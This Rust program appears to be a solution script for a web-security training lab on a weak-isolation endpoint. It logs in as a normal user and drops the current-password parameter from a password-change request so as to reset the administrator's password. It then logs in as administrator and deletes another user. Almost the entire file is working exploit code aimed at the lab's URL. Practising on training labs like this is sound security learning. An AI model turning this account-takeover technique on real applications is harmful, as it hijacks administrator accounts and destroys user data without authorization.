/*********************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 27/10/2023
*
* Lab: Weak isolation on dual-use endpoint
*
* Steps: 1. Fetch the login page
*        2. Extract the csrf token and session cookie to login
*        3. Login as wiener
*        4. Fetch wiener's profle
*        5. Extract the csrf token needed for changing password
*        6. Change the administrato's password by removing the current-password parameter 
*           from the request to skip the validation
*        7. Fetch the login page
*        8. Extract the csrf token and session cookie to login
*        9. Login as administrator
*        10. Delete carlos from the admin panel
*
**********************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a4800f70368629181f24d6300fc0086.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
    io::stdout().flush();

    // fetch the login page
    let login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting the csrf token and session cookie to login.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(login_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token
    let mut csrf =
        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
    io::stdout().flush();

    // login as wiener
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as wiener".red()));

    // extract session cookie of wiener
    session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗4⦘ Fetching wiener's profle.. ".white(),);
    io::stdout().flush();

    // fetch wiener's profle
    let wiener_cart = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch wiener's profle".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗5⦘ Extracting the csrf token needed for changing password.. ".white(),
    );
    io::stdout().flush();

    // extract the csrf token needed for changing password
    csrf = extract_csrf(wiener_cart).expect(&format!(
        "{}",
        "[!] Failed to extract the csrf token needed for changing password".red()
    ));
    println!("{}", "OK".green());

    // the new password to set for the administrator
    // you can change this to what you want
    let new_password = "hacked";

    print!(
        "{} {}.. ",
        "⦗6⦘ Changing the administrator's password to".white(),
        new_password.yellow()
    );
    io::stdout().flush();

    // change administrator's password
    client
        .post(format!("{url}/my-account/change-password"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("new-password-1", new_password),
            ("new-password-2", new_password),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to change administrator's password".red()
        ));

    println!("{}", "OK".green());
    print!("{}", "⦗7⦘ Fetching the login page.. ".white());
    io::stdout().flush();

    // fetch the login page
    let login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗8⦘ Extracting the csrf token and session cookie to login.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(login_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token
    let mut csrf =
        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗9⦘ Logging in as administrator.. ".white(),);
    io::stdout().flush();

    // login as administrator
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", new_password),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as administrator".red()));

    // extract session cookie of administrator
    session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗10⦘ Deleting carlos from the admin panel.. ".white(),);
    io::stdout().flush();

    // delete carlos
    client
        .get(format!("{url}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to delete carlos from the admin panel".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 The lab should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
